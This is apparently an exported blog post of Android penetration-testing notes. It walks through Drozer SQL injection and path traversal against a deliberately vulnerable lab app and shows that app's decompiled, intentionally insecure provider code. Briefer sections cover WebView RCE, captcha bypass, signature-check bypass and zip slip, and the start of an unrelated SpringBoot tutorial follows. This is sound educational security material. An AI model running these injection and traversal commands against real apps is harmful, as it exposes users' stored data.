
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924110021800.png" alt="image-20250924110021800"></p>
</li>
</ol>
<h3 id="Provider"><a href="#Provider" class="headerlink" title="Provider"></a>Provider</h3><h4 id="Unauthorized-Access-3"><a href="#Unauthorized-Access-3" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Content Provider 未限制访问权限，导致应用内敏感数据（如用户信息、数据库）可被任意读取。</span><br></pre></td></tr></table></figure>

<ol>
<li><p>Find out the attacksurface about com.asec.alan</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092722780.png" alt="image-20250924092722780"></p>
</li>
<li><p>Get the information about provider</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092955453.png" alt="image-20250924092955453"></p>
</li>
<li><p>Find uri of this provider</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094216723.png" alt="image-20250924094216723"></p>
</li>
<li><p>Query datas with uri</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094356414.png" alt="image-20250924094356414"></p>
</li>
</ol>
<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><ol>
<li><p>Find Sql Injection of the provider by running script</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924100755596.png" alt="image-20250924100755596"></p>
</li>
<li><p>Obtain the source code about ContentProvider through decompilation</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.ContentProvider;</span><br><span class="line"><span class="keyword">import</span> android.content.ContentValues;</span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.database.SQLException;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteOpenHelper;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.ParcelFileDescriptor;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableContentProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DB_NAME</span> <span class="operator">=</span> <span class="string">&quot;userdata.db&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DB_VERSION</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;VulnerableProvider&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> SQLiteOpenHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String str, String[] strArr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">(Uri uri)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues contentValues)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues contentValues, String str, String[] strArr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreate</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.dbHelper = <span class="keyword">new</span> <span class="title class_">SQLiteOpenHelper</span>(getContext(), DB_NAME, <span class="literal">null</span>, <span class="number">1</span>) &#123; <span class="comment">// from class: com.asec.alan.VulnerableContentProvider.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.database.sqlite.SQLiteOpenHelper</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase sQLiteDatabase, <span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.database.sqlite.SQLiteOpenHelper</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase sQLiteDatabase)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)&quot;</span>);</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;INSERT INTO users (username, password) VALUES (&#x27;admin&#x27;, &#x27;admin123&#x27;)&quot;</span>);</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;INSERT INTO users (username, password) VALUES (&#x27;user1&#x27;, &#x27;pass1&#x27;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        createTestFile();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">createTestFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getContext().getFilesDir(), <span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fileOutputStream.write(<span class="string">&quot;Vulnerable content for traversal test&quot;</span>.getBytes());</span><br><span class="line">                fileOutputStream.close();</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;测试文件已创建：&quot;</span> + file.getAbsolutePath());</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;创建测试文件失败&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri uri, String str)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedPath</span> <span class="operator">=</span> uri.getEncodedPath();</span><br><span class="line">        <span class="keyword">if</span> (encodedPath.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">            encodedPath = encodedPath.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getContext().getFilesDir().getParentFile(), encodedPath);</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;尝试访问文件：&quot;</span> + file.getAbsolutePath());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file, <span class="number">268435456</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] strArr, String str, String[] strArr2, String str2)</span> &#123;</span><br><span class="line">        <span class="type">SQLiteDatabase</span> <span class="variable">readableDatabase</span> <span class="operator">=</span> <span class="built_in">this</span>.dbHelper.getReadableDatabase();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;SELECT * FROM users WHERE &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">null</span>) &#123;</span><br><span class="line">            str = <span class="string">&quot;1=1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> readableDatabase.rawQuery(sb.append(str).toString(), <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>SQL Inject: determine the number of columns</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 order by 10&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924101320234.png" alt="image-20250924101320234"></p>
</li>
<li><p>SQL Inject: Determine some information about the database</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 0, 00, sqlite_version()&quot;</span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 0, 00, sql from sqlite_master&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102628867.png" alt="image-20250924102628867"></p>
</li>
<li><p>SQL Inject: Query data of other tables</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 11, 22, locale from android_metadata&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102809532.png" alt="image-20250924102809532"></p>
</li>
</ol>
<h4 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a>Directory Traversal</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Content Provider 的openFile()方法未验证文件路径，导致攻击者可访问应用沙盒外的任意文件</span><br></pre></td></tr></table></figure>

<ol>
<li><p>Scanner traversal vulnerbilities of provider</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.asec.alan</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103551392.png" alt="image-20250924103551392"></p>
</li>
<li><p>Read other files’ contents by traversal vulnerability</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.read content://com.asec.alan.provider/../../../../../../../../../../../../../../../system/etc/hosts</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103733116.png" alt="image-20250924103733116"></p>
</li>
</ol>
<h2 id="Unsafe-Configuration"><a href="#Unsafe-Configuration" class="headerlink" title="Unsafe Configuration"></a>Unsafe Configuration</h2><h3 id="Allow-Backup"><a href="#Allow-Backup" class="headerlink" title="Allow Backup"></a>Allow Backup</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">通讯录应用，一旦应用程序支持备份和恢复功能，攻击者即可通过 adb backup 和 adb restore 进行恢复新安装的同一个应用来查看聊天记录等信息</span><br><span class="line">支付金融类应用，攻击者可通过此来进行恶意支付、盗取存款等</span><br></pre></td></tr></table></figure>

<h3 id="Debuggable"><a href="#Debuggable" class="headerlink" title="Debuggable"></a>Debuggable</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">android:debuggable属性是指定应用程序是否能够被调试，即时是以用户模式运行在设备上的时候，如果设置为 true ，则能够被调试，否则不能调试，默认值是false</span><br><span class="line"></span><br><span class="line">逆向工作人员在对一个apk程序进行逆向时，第一步往往就是要对debuggable属性进行绕过，否则就不能进行正常的调试，因此如果属性本身设为true，更容易导致该应用存在动态调试，泄露数据信息的风险</span><br></pre></td></tr></table></figure>

<h3 id="Information-Leakage"><a href="#Information-Leakage" class="headerlink" title="Information Leakage"></a>Information Leakage</h3><h4 id="LogCat输出敏感信息漏洞"><a href="#LogCat输出敏感信息漏洞" class="headerlink" title="LogCat输出敏感信息漏洞"></a>LogCat输出敏感信息漏洞</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">在APP的开发过程中，为了方便调试，开发者通常会用logcat输出info、debug、error 等信息。如果在APP发布时没有去掉logcat信息，可能会导致攻击者通过查看logcat日志获得敏感信息.</span><br><span class="line"></span><br><span class="line">应用层Log敏感信息输出</span><br><span class="line">应用层System.out.println敏感信息输出</span><br><span class="line">系统bug异常导致Log输出</span><br><span class="line">Native层敏感Log输出</span><br></pre></td></tr></table></figure>

<h4 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">一些开发人员，在开发时使用硬编码的方式，导致存在一定的安全风险，硬编码一般是指将输出或输入的相关参数以常量的方式编写在源代码中，这样导致逆向分析人员可以直接通过分析源码就可以获得敏感信息</span><br></pre></td></tr></table></figure>

<h4 id="Shared-Preference全局可读写漏洞"><a href="#Shared-Preference全局可读写漏洞" class="headerlink" title="Shared Preference全局可读写漏洞"></a>Shared Preference全局可读写漏洞</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Shared Preferences存储安全风险在于：开发者在创建文件时没有正确的选择合适的创建模式（MODE_PRIVATE、MODE_WOELD_READABLE以及MODE_WORLD_WRITEABBLE）进行权限控制，导致将一些用户信息、密码等敏感信息存储在Shared Preferences文件中，攻击者可以通过root来查看敏感信息</span><br></pre></td></tr></table></figure>

<h4 id="SD卡读写"><a href="#SD卡读写" class="headerlink" title="SD卡读写"></a>SD卡读写</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">现在的手机很多的公共目录都是自身自带的存储空间，Android系统的文件一般都存储在sdCard和应用的私有目录下，任何在Android Manifest中声明读写sdcard权限的应用都可以对sdcard进行读写。</span><br></pre></td></tr></table></figure>

<h2 id="Unsafe-HTTP-s"><a href="#Unsafe-HTTP-s" class="headerlink" title="Unsafe HTTP&#x2F;s"></a>Unsafe HTTP&#x2F;s</h2><h3 id="Plaintext-Transmit"><a href="#Plaintext-Transmit" class="headerlink" title="Plaintext Transmit"></a>Plaintext Transmit</h3><h3 id="Lack-verification-of-certificate"><a href="#Lack-verification-of-certificate" class="headerlink" title="Lack verification of certificate"></a>Lack verification of certificate</h3><h3 id="Lack-verification-of-hostname"><a href="#Lack-verification-of-hostname" class="headerlink" title="Lack verification of hostname"></a>Lack verification of hostname</h3><h3 id="Bypass-certificate"><a href="#Bypass-certificate" class="headerlink" title="Bypass certificate"></a>Bypass certificate</h3><h2 id="Captcha"><a href="#Captcha" class="headerlink" title="Captcha"></a>Captcha</h2><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">验证码暴力破解漏洞一般是因为用户使用手机号+验证码的方式进行登陆时，短信验证码一般由4-6位数字组成，而且APP并未对验证码做时间和失败次数校验，所以攻击者可以通过这个区间的所有数字进行暴力破解来进行攻击</span><br></pre></td></tr></table></figure>

<h3 id="Interface-Abuse"><a href="#Interface-Abuse" class="headerlink" title="Interface Abuse"></a>Interface Abuse</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">验证码无限次数发送、短信轰炸漏洞一般是APP端并没有对手机号码进行次数显示，也未对访问进行时间限制</span><br></pre></td></tr></table></figure>

<h3 id="Amnipotent-Captcha"><a href="#Amnipotent-Captcha" class="headerlink" title="Amnipotent Captcha"></a>Amnipotent Captcha</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 验证码执行【找回密码】操作时，输入手机号，获取验证码，服务器会向手机发送验证码，通过burpsuite抓包工具，查看返回的响应数据包中如果包含验证码，则可能导致用户密码恶意重置、绑定手机号被恶意更换等风险</span><br><span class="line">2. 万能验证码一般是开发在业务未上线的时候为了方便测试用的,上线后忘记删除了,例如[8888 0000 1234](tel:8888 0000 1234)等等</span><br></pre></td></tr></table></figure>

<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">在APP验证码测试过程中，我们发现很对APP并未对登录成功的响应报文进行校验，导致我们获取登录成功的响应报文后，就可以通过正确的响应报文实现任意号码的登录，导致信息泄露</span><br></pre></td></tr></table></figure>

<h2 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</span><br><span class="line">（1）Android中的对象有一公共的方法：getClass() </span><br><span class="line">（2）该方法可以获取到当前类 类型Class</span><br><span class="line">（3）该类有一关键的方法： Class.forName；</span><br><span class="line">（4）该方法可以加载一个类（可加载 java.lang.Runtime 类）</span><br><span class="line">（5）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure>

<h3 id="Plaintext-Strorage"><a href="#Plaintext-Strorage" class="headerlink" title="Plaintext Strorage"></a>Plaintext Strorage</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">用户输入密码时，会弹出提示框：询问用户是否保存密码；如果选择”是”，密码会被明文保到 /data/data/com.package.name/databases/webview.db 中</span><br></pre></td></tr></table></figure>

<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</span><br><span class="line">这样使得WebView可以使用File协议，和加载Js代码读取本地文件，或访问http源，这样会导致攻击者操作用户点击后无感知下载恶意的HTML/JS，并窃取相关的私有文件信息</span><br></pre></td></tr></table></figure>

<h3 id="任意界面注入"><a href="#任意界面注入" class="headerlink" title="任意界面注入"></a>任意界面注入</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</span><br><span class="line">用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接</span><br></pre></td></tr></table></figure>

<h3 id="Cookie盗用"><a href="#Cookie盗用" class="headerlink" title="Cookie盗用"></a>Cookie盗用</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">攻击者创造符号链接，然后绕过校验，访问攻击的html，再通过软链接去加载symlink.html，然后窃取Cooike</span><br></pre></td></tr></table></figure>

<h3 id="Launch-Any-Where"><a href="#Launch-Any-Where" class="headerlink" title="Launch Any Where"></a>Launch Any Where</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起launchAnyWhere漏洞</span><br></pre></td></tr></table></figure>

<h3 id="DeepLink-RCE"><a href="#DeepLink-RCE" class="headerlink" title="DeepLink_RCE"></a>DeepLink_RCE</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">样本代码层通过反射调用去安装的列表中搜索安装的应用，然后去调用其方法进行实现，我们可以构造相同的包名，然后将攻击样本去安装到手机上，是的应用触发任意代码执行漏洞</span><br></pre></td></tr></table></figure>

<h3 id="WebView-loadDataWithBaseURL"><a href="#WebView-loadDataWithBaseURL" class="headerlink" title="WebView loadDataWithBaseURL"></a>WebView loadDataWithBaseURL</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">当loadDataWithBaseURL的域名和内容同时可控是，可以构造任意域下的XSS;通过恶意的deeplink打开任意fragment的漏洞，实现可控任意域执行任意JS，实现盗取登陆态的用户cookie！</span><br></pre></td></tr></table></figure>

<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="不安全的动态加载"><a href="#不安全的动态加载" class="headerlink" title="不安全的动态加载"></a>不安全的动态加载</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Android系统提供类加载器DexClassLoader，可以在运行时动态加载执行包含的JAR或APK文件内的DEX文件，这样可能导致所加载的Dex文件被恶意应用替换或代码注入，如果不对Dex文件进行签名校验，就可能导致加载的是恶意代码，这样就会进一步造成严重危害</span><br></pre></td></tr></table></figure>

<h3 id="签名绕过"><a href="#签名绕过" class="headerlink" title="签名绕过"></a>签名绕过</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">java层的签名校验：</span><br><span class="line">原理：这种是开发者在APK java层中加入了签名校验代码，然后通过校验加入文件的MD5值或者SHA1值来对文件进行校验</span><br><span class="line">解决方案：一般这种情况，我们通过定位到APK中的签名代码段，然后进行hook 篡改或者进行修改后重打包就可以进行绕过</span><br><span class="line">so层的签名校验：</span><br><span class="line">原理：由于java可解释语言的原因，所以后来开发者又将签名代码放入so层，从而增加逆向工作的难度</span><br><span class="line">解决方案：这种情况，同样可以使用IDA或GDB进行动态调试确定到签名代码段，然后使用hook 注入技术或静态修改来进行绕过</span><br><span class="line">在线签名校验：</span><br><span class="line">原理：由于前两种方式都是静态校验的方式，这样的安全性仍然较低，后来更多厂商通过服务器在线进行验证，将签名密钥发送然后在so层或java层中进行校验</span><br><span class="line">解决方案：这种情况，我们要使用抓包软件对服务器发送的数据包进行抓取，在成功获取正确密钥后，再去hook对应的签名代码段，从而就可以实现绕过</span><br></pre></td></tr></table></figure>

<h3 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">因为Linux系统中../代表向上级目录跳转，攻击者可以通过构造相应的Zip文件，利用多个&#x27;../&#x27;从而改变zip包中某个文件的存放位置，费用该替换掉应用原有的文件，完成目录穿越。这样严重可能会导致任意代码执行漏洞，危害应用用户的设备安全和信息安全</span><br><span class="line"></span><br><span class="line">Java 代码在解压 zip 文件时，会使用到 ZipEntry 类的 getName() 方法，如果 zip 文件中包含 ../ 的字符串，该方法返回值会原样返回。如果没有过滤掉 getName() 返回值中的 ../ 字符串，继续解压缩操作，就会在其他目录中创建解压的文件</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>APK</tag>
        <tag>Drozer</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot入门</title>
    <url>/SpringBootDev.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="快速启动"><a href="#快速启动" class="headerlink" title="快速启动"></a>快速启动</h1><h2 id="产品背景"><a href="#产品背景" class="headerlink" title="产品背景"></a>产品背景</h2><ol>
<li><p>Spring生态众多，不止一两个框架而已，下图是一些Spring生态中比较出名的框架。可以看到从数据库、web、cloud到Android、LDAP等等，很多方向都有框架。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110231515495.png" alt="image-20251110231515495"></p>
</li>
<li><p>SpringFramework（以下简称SF）是Spring生态中最重要的一环、是最根本的基石，简单理解Spring中其他框架都来自于SF，所以也有很多人把SF简称为Spring，就像把DBMS简称为数据库是一样的道理。SpringBoot（以下简称SB）是基于SF，在web方向开发出来的一款框架（其实SF中的SpringMVC本就可以开发web，以前的“SSM”三件套，只是SB更加专业，逐渐代替了SSM）。SB对于开发者而言方便很多，现在Java后端几乎都采用SB进行开发，而且如下图所示，SB还可以和其他的一些工具&#x2F;框架相结合，使得web框架可定制化程度更高，更加受到开发者的青睐。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
</li>
<li><p>SB与SF的对应关系</p>
<table>
<thead>
<tr>
<th align="center">Spring Boot 版本</th>
<th align="center">对应的 Spring Framework 版本范围</th>
<th align="center">发布时间</th>
<th align="center">支持状态</th>
</tr>
</thead>
<tbody><tr>
<td align="center">3.3.x</td>
<td align="center">6.2.x</td>
<td align="center">2024 年</td>
<td align="center">最新版本，持续更新</td>
</tr>
<tr>
<td align="center">3.2.x</td>
<td align="center">6.1.x</td>
<td align="center">2023 年底</td>
<td align="center">活跃支持中（OSS 支持至 2025 年）</td>
</tr>
<tr>
<td align="center">3.1.x</td>
<td align="center">6.0.x</td>
<td align="center">2023 年</td>
<td align="center">已停止 OSS 支持，商业支持中</td>
</tr>
<tr>
<td align="center">3.0.x</td>
<td align="center">6.0.x（早期版本）</td>
<td align="center">2022 年底</td>
<td align="center">已停止支持</td>
</tr>
<tr>
<td align="center">2.7.x（LTS）</td>
<td align="center">5.3.x</td>
<td align="center">2021 年</td>
<td align="center">长期支持（至 2025 年 11 月）</td>
</tr>
<tr>
<td align="center">2.6.x</td>
<td align="center">5.3.x</td>
<td align="center">2021 年</td>
<td align="center">已停止支持</td>
</tr>
<tr>
<td align="center">2.5.x</td>
<td align="center">5.3.x</td>
<td align="center">2021 年</td>
<td align="center">已停止支持</td>
</tr>
<tr>
<td align="center">2.4.x</td>
<td align="center">5.3.x</td>
<td align="center">2020 年</td>
<td align="center">已停止支持</td>
</tr>
<tr>
<td align="center">2.3.x</td>
<td align="center">5.2.x</td>
<td align="center">2020 年</td>
<td align="center">已停止支持</td>
</tr>
<tr>
<td align="center">2.2.x</td>
<td align="center">5.2.x</td>
<td align="center">2019 年</td>
<td align="center">已停止支持</td>
</tr>
<tr>
<td align="center">2.1.x（LTS）</td>
<td align="center">5.1.x</td>
<td align="center">2018 年</td>
<td align="center">已停止支持</td>
</tr>
<tr>
<td align="center">2.0.x</td>
<td align="center">5.0.x</td>
<td align="center">2018 年</td>
<td align="center">已停止支持</td>
</tr>
<tr>
<td align="center">1.5.x（LTS）</td>
<td align="center">4.3.x</td>
<td align="center">2017 年</td>
<td align="center">已停止支持</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><ol>
<li><p>通过SpringBoot（以下简称SB）插件快速创建SB项目</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224213490.png" alt="image-20251110224213490"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
</li>
<li><p>项目结构</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224556678.png" alt="image-20251110224556678"></p>
</li>
<li><p>关键代码展示（IOC&#x2F;DI）</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过<span class="doctag">@Component</span>注解，将这个类注册为SB的一个组件，交给SB框架进行管理****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl1</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

